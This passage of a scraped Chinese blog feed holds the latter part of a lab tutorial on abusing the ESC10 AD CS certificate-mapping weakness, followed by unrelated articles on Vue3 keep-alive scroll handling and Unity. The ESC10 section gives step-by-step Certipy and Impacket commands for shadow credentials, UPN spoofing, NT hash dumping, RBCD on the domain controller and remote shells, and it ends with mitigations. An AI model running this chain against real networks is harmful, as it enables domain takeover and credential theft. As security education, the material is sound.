<p>影子凭据允许我们生成自己的密钥对并将其注入到目标账户的 <code>msDS-KeyCredentialLink</code> 属性中。这为我们提供了一种以用户 james 身份进行身份验证而无需更改其实际密码的方式。</p>
<p>我们将使用Certipy的 <code>shadow</code> 命令：</p>
<pre><code class="hljs language-bash" lang="bash">certipy-ad shadow auto -u <span class="hljs-string">'blwasp@lab.local'</span> -p <span class="hljs-string">'Password123!'</span> -account james -dc-ip 10.129.228.236
</code></pre>
<p>为 James 创建影子凭据。</p>
<h5 data-id="heading-12">4. 修改UPN</h5>
<p>现在，为了匹配我们想要伪装的身份，在我们的案例中是 administrator (域管理员)。这一步很重要，因为当我们稍后请求证书时，嵌入在证书中的UPN将是KDC用于账户映射的内容。</p>
<p>如果UPN与特权账户匹配，KDC会将证书映射到该账户并允许我们伪装它。要更新用户 james 的UPN，我们可以使用以下Certipy命令。</p>
<pre><code class="hljs language-bash" lang="bash">certipy-ad account update -u <span class="hljs-string">'blwasp@lab.local'</span> -p <span class="hljs-string">'Password123!'</span> -user james -upn administrator@lab.local -dc-ip 10.129.228.236
</code></pre>
<p>将 james 的UPN修改为 administrator。</p>
<h5 data-id="heading-13">5. 以伪装用户的身份请求证书</h5>
<p>更新目标用户 james 的UPN并添加影子凭据后，我们现在可以使用易受攻击的模板为 james 请求证书。</p>
<p>我们可以使用内置的“用户”模板（如果启用），或任何其他易受攻击的模板，只要它满足以下条件：</p>
<ul>
<li>允许客户端身份验证（扩展密钥用法：客户端身份验证）</li>
<li>具有允许低权限用户（如域用户、Everyone 或 Authenticated Users）注册的宽松注册权限。</li>
</ul>
<p>要请求证书，我们可以使用Certipy中的 <code>req</code> 选项：</p>
<pre><code class="hljs language-bash" lang="bash">certipy-ad req -u <span class="hljs-string">'james@lab.local'</span> -hashes 7facdc498ed1680c4fd1448319a8c04f -ca lab-LAB-DC-CA -template User -dc-ip 10.129.228.236 -debug
</code></pre>
<p>由于UPN现在与 Administrator 的UPN匹配，证书在身份验证期间将被映射到 Administrator 账户，从而允许我们伪装成他们。</p>
<p>使用 James 的哈希请求证书。</p>
<h5 data-id="heading-14">6. 恢复更改</h5>
<p>获取证书后，我们需要将 james 的UPN恢复为其原始值，以避免身份验证问题。</p>
<p>如果UPN保持为 <code>administrator@lab.local</code>，DC可能将证书映射到错误的对象，在这种情况下，会映射到 james 而不是真正的 Administrator。这可能会触发名称不匹配错误，甚至在尝试请求TGT时触发 <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>。</p>
<pre><code class="hljs language-bash" lang="bash">certipy-ad account update -u <span class="hljs-string">'blwasp@lab.local'</span> -p <span class="hljs-string">'Password123!'</span> -user james -upn james@lab.local -dc-ip 10.129.228.236
</code></pre>
<p>恢复对 James 账户的更改。</p>
<h5 data-id="heading-15">7. 转储伪装账户的NT哈希</h5>
<p>现在我们有了证书，我们可以使用 <code>auth</code> 命令以域管理员身份进行身份验证并转储NT哈希：</p>
<pre><code class="hljs language-bash" lang="bash">certipy-ad auth -pfx administrator.pfx -domain lab.local -dc-ip 10.129.228.236
</code></pre>
<p>管理员哈希。</p>
<h5 data-id="heading-16">8. 使用NetExec验证哈希</h5>
<p>接下来，使用 nxc 通过以下命令验证NT哈希：</p>
<pre><code class="hljs language-bash" lang="bash">nxc ldap 10.129.228.236 -u administrator -H 2b576acbe6bcfda7294d6bd18041b8fe -d lab.local
</code></pre>
<p>验证域管理员哈希。</p>
<h4 data-id="heading-17">Schannel映射</h4>
<p>当 <code>CertificateMappingMethods</code> 设置为UPN映射 (<code>0x04</code>) 时，AD信任任何具有匹配UPN的证书；不强制执行强绑定。</p>
<p>这意味着我们可以修改UPN以匹配一个高权限账户，并且证书将被接受为该账户。</p>
<p>在基于Schannel的身份验证中（通常通过LDAPS使用），我们不能像在Kerberos案例中那样使用用户证书进行身份验证。Schannel身份验证允许计算机证书对目标进行身份验证。</p>
<p>因此，伪装域用户（如域管理员）在这里没有帮助。相反，我们将伪装DC计算机账户 <code>DC01$@domain.local</code> 以访问DC。</p>
<p>步骤与Kerberos案例类似，但这次我们将把UNP修改为目标DC账户，而不是域管理员账户。</p>
<h5 data-id="heading-18">1. 识别我们可以控制的用户</h5>
<p>如前所述，我们需要控制一个用户或计算机对象，以便我们可以修改其UPN进行伪装。我们将再次使用BloodHound检查当前用户 blwasp 对哪些用户或计算机拥有ACL权限。</p>
<p>我们之前知道用户 blwasp 对 james 拥有 GenericAll 权限。</p>
<h5 data-id="heading-19">2. 添加影子凭据</h5>
<p>如前所述，我们将使用Certipy创建影子凭据：</p>
<pre><code class="hljs language-bash" lang="bash">certipy-ad shadow auto -u <span class="hljs-string">'blwasp@lab.local'</span> -p <span class="hljs-string">'Password123!'</span> -account james -dc-ip 10.129.228.236
</code></pre>
<p>向 james 账户添加影子凭据。</p>
<h5 data-id="heading-20">3. 修改UPN</h5>
<p>现在我们将修改UPN。但与Kerberos案例中将其设置为域管理员用户不同，对于Schannel基于证书的身份验证，我们将其设置为DC计算机账户——在本例中为 <code>LAB-DC.LAB.LOCAL</code>。</p>
<pre><code class="hljs language-bash" lang="bash">certipy-ad account update -u <span class="hljs-string">'blwasp@lab.local'</span> -p <span class="hljs-string">'Password123!'</span> -user james -upn <span class="hljs-string">'lab-dc$@lab.local'</span> -dc-ip 10.129.228.236
</code></pre>
<p>将 james 更新为DC计算机账户。
确保在计算机账户名称中包含 <code>$</code> 并将其格式化为有效的UPN。</p>
<h5 data-id="heading-21">4. 以伪装计算机账户的身份请求证书</h5>
<p>现在我们可以使用“用户”模板为 james 请求证书。由于我们将 james 的UPN更新为DC的 (<code>LAB-DC$@lab.local</code>)，生成的证书现在应映射到DC计算机账户。</p>
<pre><code class="hljs language-bash" lang="bash">certipy-ad req -u <span class="hljs-string">'james@lab.local'</span> -hashes 7facdc498ed1680c4fd1448319a8c04f -ca lab-LAB-DC-CA -template User -dc-ip 10.129.228.236 -debug
</code></pre>
<p>请求证书。</p>
<h5 data-id="heading-22">5. 恢复更改</h5>
<p>获取证书后，我们需要将 james 的UPN恢复为其原始值，以避免身份验证问题，例如证书映射到错误的对象或触发 <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>。</p>
<pre><code class="hljs language-bash" lang="bash">certipy-ad account update -u <span class="hljs-string">'blwasp@lab.local'</span> -p <span class="hljs-string">'Password123!'</span> -user james -upn james@lab.local -dc-ip 10.129.228.236
</code></pre>
<p>恢复UPN。</p>
<h5 data-id="heading-23">6. 通过Schannel连接到DC</h5>
<p>接下来，我们使用通过滥用ESC10获得的证书对域控制器进行身份验证。Certipy提供了 <code>-ldap-shell</code> 选项，允许我们通过Schannel (LDAPS) 进行绑定。</p>
<pre><code class="hljs language-bash" lang="bash">certipy-ad auth -pfx lab-dc.pfx -domain lab.local -dc-ip 10.129.228.236 -ldap-shell
</code></pre>
<p>如下图所示，我们成功通过LDAPS以 <code>LAB\DC$</code> 身份进行了身份验证。</p>
<p>使用 lab-dc.pfx 证书通过LDAPS访问DC。
虽然这不会提供像我们获得TGT后通过Kerberos访问那样的交互式shell，但Certipy中的LDAP shell确实提供了一些命令，可用于发起诸如基于资源的约束委派 (RBCD) 等攻击以完全控制DC。</p>
<p>LDAP shell命令。
简单来说，RBCD是在目标计算机上配置的一个设置，定义了允许哪些用户或计算机代表其他用户向该计算机进行委派。</p>
<p>受信任账户列表只能在你拥有权限编辑 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性时进行修改，允许我们添加一个我们控制的用户或计算机。</p>
<p>在我们的案例中，将添加一个新的计算机账户，并设置DC计算机的RBCD以信任我们新创建的账户。</p>
<h5 data-id="heading-24">7. 创建新的计算机账户</h5>
<p>现在我们已经通过LDAPS (Schannel) 对域控制器进行了身份验证，我们可以使用Certipy的LDAP shell中的内置 <code>add_computer</code> 命令创建一个新的计算机账户。</p>
<p>我们将创建一个名为 <code>rbcd-test$</code> 的计算机账户，密码为 <code>PasswordTest123!</code>。在LDAP shell中，运行以下命令：</p>
<pre><code class="hljs">add_computer rbcd-test PasswordTest123!
</code></pre>
<p>添加后，我们完全控制 <code>rbcd-test$</code>，并可以在下一步中配置RBCD时使用它。</p>
<p>添加新计算机。</p>
<h5 data-id="heading-25">8. 在DC上设置RBCD</h5>
<p>现在我们创建了计算机账户 (<code>rbcd-test$</code>)，下一步是配置RBCD，以便它可以模拟用户访问DC (<code>lab-dc$</code>)。</p>
<p>我们将使用Certipy的LDAP shell中的 <code>set_rbcd</code> 命令来执行此操作，该命令修改DC计算机对象上的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性，以包含我们的新计算机账户。</p>
<pre><code class="hljs language-ruby" lang="ruby">set_rbcd lab-dc<span class="hljs-variable">$ </span>rbcd-test<span class="hljs-variable">$
</span></code></pre>
<p>如下图所示，<code>rbcd-test$</code> 账户已被添加到允许模拟用户访问 <code>lab-dc$</code> 的受信任账户列表中。</p>
<p>在DC上配置RBCD。
现在我们有了账户 <code>rbcd-test$</code>，它可以模拟任何用户来访问DC。我们必须切换到Kerberos以获取服务票证 (ST) 并交互式地访问DC。</p>
<p>Schannel允许你执行LDAP绑定操作，但它不授予服务票证，也不允许你作为另一个用户与SMB或WinRM等服务交互。那是Kerberos的工作。</p>
<p>Schannel身份验证可以奠定基础，但执行攻击需要Kerberos。</p>
<h5 data-id="heading-26">9. 通过Kerberos身份验证获取服务票证</h5>
<p>现在RBCD已配置，我们可以使用我们控制的计算机账户为服务（如用于SMB访问的CIFS或用于WinRM访问的HOST）请求服务票证 (TGS)。</p>
<p>我们将模拟 Administrator 账户：</p>
<pre><code class="hljs language-bash" lang="bash">impacket-getST -spn cifs/LAB-DC.LAB.LOCAL -impersonate administrator -dc-ip 10.129.228.236 lab.local/<span class="hljs-string">'rbcd-test$'</span>:<span class="hljs-string">'PasswordTest123!'</span>
</code></pre>
<p>如下图所示，如果成功，这将把票证保存在名为 <code>administrator@cifs_LAB-DC.LAB.LOCAL@LAB.LOCAL.ccache</code> 的 .ccache 文件中。</p>
<p>为管理员获取ST票证。
📌 <strong>注意</strong>：在现实场景中，不要直接模拟 administrator 账户，而是在BloodHound中查找一个实际的域管理员账户进行模拟。这样可以避免用户不存在时出现“在Kerberos数据库中未找到客户端”等问题。</p>
<h5 data-id="heading-27">10. 设置Kerberos票证</h5>
<p>之后，设置 <code>KRB5CCNAME</code> 变量指向票证，以便 wmiexec 或 smbclient 等工具可以使用它，然后使用 <code>klist</code> 命令检查票证是否正确导入。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 设置kerberos票证</span>
<span class="hljs-built_in">export</span> KRB5CCNAME=administrator@cifs_LAB-DC.LAB.LOCAL@LAB.LOCAL.ccache
<span class="hljs-comment"># 检查导入的票证</span>
klist
</code></pre>
<p>为 KRB5CCNAME 设置kerberos票证。
要清除当前的Kerberos票证：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">unset</span> KRB5CCNAME
</code></pre>
<p>要设置另一张票证：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> KRB5CCNAME=TicketName.ccache
</code></pre>
<h5 data-id="heading-28">11. 访问DC</h5>
<p>最后，我们可以使用 smbclient 或 wmiexec 使用获得的票证交互式地访问DC。</p>
<p>对于SMB访问：</p>
<pre><code class="hljs language-bash" lang="bash">impacket-smbclient -k -no-pass administrator@LAB-DC.LAB.LOCAL -dc-ip 10.129.228.236
</code></pre>
<p>对于通过WMI执行命令：</p>
<pre><code class="hljs language-bash" lang="bash">impacket-wmiexec -k -no-pass administrator@LAB-DC.LAB.LOCAL -dc-ip 10.129.228.236
</code></pre>
<p>使用WMI访问DC。</p>
<h3 data-id="heading-29">缓解措施</h3>
<ul>
<li>如果尚未应用，请应用KB5014754，该更新强制执行强证书映射。</li>
<li>如果未应用补丁，请将 <code>StrongCertificateBindingEnforcement</code> 设置为2（完全强制执行）或至少1（兼容模式）。</li>
<li>通过移除或避免 <code>0x04</code> 值来禁用弱UPN映射：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel</code> 中的值 <code>0x04</code> 允许UPN匹配，这正是ESC10所滥用的。</li>
</ul>
<h3 data-id="heading-30">总结</h3>
<p>今天，我们探讨了如何滥用另一个ADCS漏洞ESC10，它建立在ESC9之上，并通过注册表配置错误攻击证书映射。</p>
<p>我们演示了攻击者如何利用Kerberos和Schannel两种基于证书的身份验证通道来伪装特权用户、配置RBCD，并最终完全控制域。修补和注册表加固对于防止此类攻击至关重要。</p>
<p>下次见，感谢阅读！</p>
<h3 data-id="heading-31">资源</h3>
<ul>
<li>Certipy 4.0: ESC9 &amp; ESC10, BloodHound GUI, New Authentication and Request Methods — and more!</li>
<li>KB5014754: Certificate-based authentication changes on Windows domain controllers</li>
<li>ADCS Exploitation Part 1: Common Attacks</li>
<li>Skidaddle Skideldi — I just pwnd your PKI</li>
<li>ADCS Attack Paths in BloodHound — Part 3</li>
<li>Certificates and Pwnage and Patches, Oh My!</li>
<li>Defending Your Directory: An Expert Guide to Fortifying Active Directory Certificate Services (ADCS) Against Exploitation</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 + Keep-Alive：实习中遇到的 window 滚动问题与实践]]></title>    <link>https://juejin.cn/post/7580287383787847723</link>    <guid>https://juejin.cn/post/7580287383787847723</guid>    <pubDate>2025-12-06T09:47:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580287383787847723" data-draft-id="7580297762189967401" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 + Keep-Alive：实习中遇到的 window 滚动问题与实践"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-06T09:47:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="cindershade"/> <meta itemprop="url" content="https://juejin.cn/user/2587590326494763"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 + Keep-Alive：实习中遇到的 window 滚动问题与实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2587590326494763/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    cindershade
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:47:00.000Z" title="Sat Dec 06 2025 09:47:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue3 + Keep-Alive：实习中遇到的 window 滚动问题与实践</h2>
<h3 data-id="heading-1">前景：实习项目中的困扰</h3>
<p>在实习期间，我参与了公司项目的前端开发，页面主要包括首页（Home）和探索页（Explore）。在项目中，这两个页面都使用 <code>window</code> 作为滚动容器。测试时发现一个问题：</p>
<pre><code class="hljs language-javascript" lang="javascript">首页和探索页都使用 <span class="hljs-variable language_">window</span> 作为滚动容器
↓
它们共享同一个 <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span>（全局变量）
↓
用户在探索页滚动到 500px
↓
<span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> = <span class="hljs-number">500</span>（全局状态）
↓
切换到首页（首页组件被缓存，状态保留）
↓
但 <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> 仍然是 <span class="hljs-number">500</span>（全局共享）
↓
首页显示时，看起来也在 500px 的位置 ❌
</code></pre>
<p>这个问题的原因在于：</p>
<ul>
<li><code>&lt;keep-alive&gt;</code> 只缓存组件实例和 DOM，不管理滚动状态。</li>
<li><code>window.scrollY</code> 是全局浏览器状态，不会随组件缓存自动恢复。</li>
<li>结果就是组件被缓存后，滚动位置被错误共享，导致用户体验不佳。</li>
</ul>
<hr/>
<h3 data-id="heading-2">我的思路：滚动位置管理工具</h3>
<p>为了在自己的项目中解决类似问题，我考虑了手动管理滚动位置的方案：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 滚动位置管理工具
 * 用于在 keep-alive 缓存页面时，为每个路由独立保存和恢复滚动位置
 */</span>
<span class="hljs-keyword">const</span> scrollPositions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">saveScrollPosition</span>(<span class="hljs-params">routePath</span>) {
  <span class="hljs-keyword">const</span> y = <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">scrollTop</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">scrollTop</span>
  scrollPositions.<span class="hljs-title function_">set</span>(routePath, y)
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">restoreScrollPosition</span>(<span class="hljs-params">routePath, defaultY = <span class="hljs-number">0</span></span>) {
  <span class="hljs-keyword">const</span> saved = scrollPositions.<span class="hljs-title function_">get</span>(routePath) ?? defaultY
  <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(<span class="hljs-number">0</span>, saved)
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">scrollTop</span> = saved
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">scrollTop</span> = saved
  })
}
</code></pre>
<p>在组件中配合 Vue 生命周期钩子使用：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { onActivated, onBeforeUnmount } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { useRoute } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-keyword">import</span> { saveScrollPosition, restoreScrollPosition } <span class="hljs-keyword">from</span> <span class="hljs-string">'./scrollManager'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()

    <span class="hljs-comment">// 组件激活时恢复滚动</span>
    <span class="hljs-title function_">onActivated</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">restoreScrollPosition</span>(route.<span class="hljs-property">path</span>, <span class="hljs-number">0</span>)
    })

    <span class="hljs-comment">// 组件离开前保存滚动</span>
    <span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">saveScrollPosition</span>(route.<span class="hljs-property">path</span>)
    })
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-3">公司项目的简化处理</h3>
<p>在公司项目中，由于页面结构简单，不需要为每个路由保存独立滚动位置，因此我采用了<strong>统一重置滚动到顶部</strong>的方式：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 路由切换后重置滚动位置</span>
router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">path</span> !== <span class="hljs-keyword">from</span>.<span class="hljs-property">path</span>) {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">scrollTop</span> = <span class="hljs-number">0</span>
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">scrollTop</span> = <span class="hljs-number">0</span>
    }, <span class="hljs-number">0</span>)
  }
})
</code></pre>
<p>这样可以保证：</p>
<ul>
<li>切换页面时始终从顶部开始。</li>
<li>简单易维护，符合公司项目需求。</li>
<li>避免了 Keep-Alive 缓存滚动穿透的问题。</li>
</ul>
<hr/>
<h3 data-id="heading-4">总结</h3>
<ol>
<li><code>&lt;keep-alive&gt;</code> 缓存组件实例，但不管理 window 滚动状态，导致全局滚动共享问题。</li>
<li>自己项目中，可以通过<strong>滚动位置管理工具</strong>为每个路由独立保存和恢复滚动。</li>
<li>公司项目中，为简化处理，只需在路由切换后<strong>重置滚动到顶部</strong>即可。</li>
<li>总体经验：滚动管理要根据项目复杂度和需求选择方案，既保证用户体验，又保证可维护性。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【基础】Unity着色器网格和计算对象介绍]]></title>    <link>https://juejin.cn/post/7580277964341592074</link>    <guid>https://juejin.cn/post/7580277964341592074</guid>    <pubDate>2025-12-06T09:47:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580277964341592074" data-draft-id="7580329353352413230" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【基础】Unity着色器网格和计算对象介绍"/> <meta itemprop="keywords" content="Unity3D,游戏开发,图形学"/> <meta itemprop="datePublished" content="2025-12-06T09:47:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SmalBox"/> <meta itemprop="url" content="https://juejin.cn/user/2218166695237532"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【基础】Unity着色器网格和计算对象介绍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2218166695237532/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SmalBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:47:07.000Z" title="Sat Dec 06 2025 09:47:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
